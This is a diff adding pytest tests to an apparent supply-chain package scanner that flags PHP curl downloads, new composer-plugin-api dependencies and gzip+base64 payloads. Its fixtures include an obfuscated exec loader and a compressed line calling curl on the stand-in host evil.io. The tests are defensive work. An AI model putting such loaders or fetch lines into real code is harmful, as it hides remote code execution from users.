@@ -33,6 +33,7 @@ from activities.package_diff import (
     _cargo_git_deps_added,
     _compare_artifact_to_source,
     _composer_autoload_files_added,
+    _composer_plugin_api_added,
     _composer_plugin_type_added,
     _count_extra_lines,
     _diff_added_lines,
@@ -41,6 +42,7 @@ from activities.package_diff import (
     _get_vcs_repo_for_package,
     _go_sum_lines_removed,
     _has_binary_content,
+    _has_gzip_b64_payload,
     _has_obfuscation,
     _has_zero_width_unicode,
     _is_noise,
@@ -2593,3 +2595,138 @@ async def test_compare_artifact_to_source_detects_injection(monkeypatch):
         )
     assert mismatch is True
     assert "mypkg/__init__.py" in files
+
+
+# ---------------------------------------------------------------------------
+# Bun binary download detection (PHP net-call pattern)
+# ---------------------------------------------------------------------------
+
+
+def test_php_bun_download_flagged_as_net_call(tmp_path):
+    """curl download of a Bun runtime in a PHP file sets network_calls_in_lib."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "src/install.php": (
+                "<?php\n"
+                "shell_exec('curl -fsSL https://github.com/oven-sh/bun/releases/download/bun-v1.0.0/bun-linux-x64.zip');\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_php_bun_download_pattern():
+    """Bun release URL matches the PHP net-call pattern directly."""
+    assert (
+        _added_lines_have_net_calls(
+            ["shell_exec('curl https://github.com/oven-sh/bun/releases/download/bun-v1.0/bun.zip')"],
+            ".php",
+        )
+        is True
+    )
+
+
+# ---------------------------------------------------------------------------
+# Composer composer-plugin-api dependency detection
+# ---------------------------------------------------------------------------
+
+
+def test_composer_plugin_api_added_flags_new_dep(tmp_path):
+    """Adding composer-plugin-api to require is flagged."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"require": {"php": ">=8.0"}}')
+    new.write_text('{"require": {"php": ">=8.0", "composer-plugin-api": "^2.0"}}')
+    assert _composer_plugin_api_added(old, new) is True
+
+
+def test_composer_plugin_api_not_flagged_when_already_present(tmp_path):
+    """No change when composer-plugin-api was already required."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"require": {"composer-plugin-api": "^1.0"}}')
+    new.write_text('{"require": {"composer-plugin-api": "^2.0"}}')
+    assert _composer_plugin_api_added(old, new) is False
+
+
+def test_composer_plugin_api_not_flagged_when_absent(tmp_path):
+    """Neither old nor new has composer-plugin-api → no flag."""
+    old = tmp_path / "old.json"
+    new = tmp_path / "new.json"
+    old.write_text('{"require": {"php": ">=8.0"}}')
+    new.write_text('{"require": {"php": ">=8.1"}}')
+    assert _composer_plugin_api_added(old, new) is False
+
+
+def test_composer_plugin_api_triggers_install_script_added(tmp_path):
+    """_build_diff sets install_script_added when composer-plugin-api appears in composer.json."""
+    old = _write_files(
+        tmp_path / "old",
+        {"composer.json": '{"require": {"php": ">=8.0"}}'},
+    )
+    new = _write_files(
+        tmp_path / "new",
+        {"composer.json": '{"require": {"php": ">=8.0", "composer-plugin-api": "^2.0"}}'},
+    )
+    _, install_added, *_ = _build_diff(old, new)
+    assert install_added is True
+
+
+# ---------------------------------------------------------------------------
+# Dual gzip+base64 payload detection
+# ---------------------------------------------------------------------------
+
+
+def test_gzip_b64_payload_detected(tmp_path):
+    """A file containing a base64 string whose decoded bytes start with gzip magic is flagged."""
+    import base64
+    import gzip
+
+    payload = gzip.compress(b"import subprocess; subprocess.run(['curl', 'http://evil.io'])")
+    b64 = base64.b64encode(payload).decode()
+    f = tmp_path / "loader.py"
+    f.write_text(f'DATA = "{b64}"\n')
+    assert _has_gzip_b64_payload(f) is True
+
+
+def test_gzip_b64_payload_not_triggered_by_plain_b64(tmp_path):
+    """A base64 string that decodes to non-gzip content is not flagged."""
+    import base64
+
+    plain = base64.b64encode(b"Hello, world! This is a normal string." * 5).decode()
+    f = tmp_path / "data.py"
+    f.write_text(f'DATA = "{plain}"\n')
+    assert _has_gzip_b64_payload(f) is False
+
+
+def test_gzip_b64_payload_in_new_file_sets_obfuscated(tmp_path):
+    """_build_diff sets obfuscated_code when a new Python file has a gzip+b64 payload."""
+    import base64
+    import gzip
+
+    payload = gzip.compress(b"exec(open('/tmp/stage2').read())")
+    b64 = base64.b64encode(payload).decode()
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"evil/loader.py": f'import base64,gzip\nexec(gzip.decompress(base64.b64decode("{b64}")))\n'},
+    )
+    *_, obfuscated = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_gzip_b64_payload_short_string_not_flagged(tmp_path):
+    """Gzip b64 strings with fewer than 60 trailing chars after H4sI are ignored."""
+    import base64
+    import gzip
+
+    payload = gzip.compress(b"hi")
+    b64 = base64.b64encode(payload).decode()
+    # Short gzip payloads have fewer than 60 chars after 'H4sI', so they're not flagged.
+    assert len(b64) < 64
+    f = tmp_path / "data.py"
+    f.write_text(f'DATA = "{b64}"\n')
+    assert _has_gzip_b64_payload(f) is False
